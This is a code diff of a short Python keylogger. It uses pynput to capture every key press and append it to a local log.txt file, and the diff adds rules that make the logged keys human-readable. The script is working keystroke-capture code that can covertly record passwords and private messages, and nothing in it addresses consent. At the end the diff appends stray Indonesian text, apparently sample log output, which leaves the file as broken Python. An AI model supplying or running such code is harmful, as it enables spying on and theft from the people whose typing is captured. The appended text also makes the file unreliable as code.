@@ -1,11 +1,26 @@
 from pynput.keyboard import Listener
 
 def writetofile(key):
-    keyData = str(key)
+
+    letter = str(key)
+    # ======== key replace ========
+    letter = letter.replace("'","")
+    letter = letter.replace("Key.space"," ")
+    letter = letter.replace("Key.enter","\n")
+    letter = letter.replace("Key.backspace"," (user press backspace) ")
+    letter = letter.replace("Key.tab","\t")
+    letter = letter.replace("Key.ctrlz "," (user press ctrlZ) ")
+    letter = letter.replace("Key.ctrls ","")
+    letter = letter.replace("Key.alt","")
+
+
     # creating the file for the keystroke 
     with open("log.txt","a") as file:
-        file.write(keyData)
+        file.write(letter)
 
 with Listener(on_press = writetofile) as l:
     l.join()
 
+halo semua
+aku lagi ngetik
+    tab
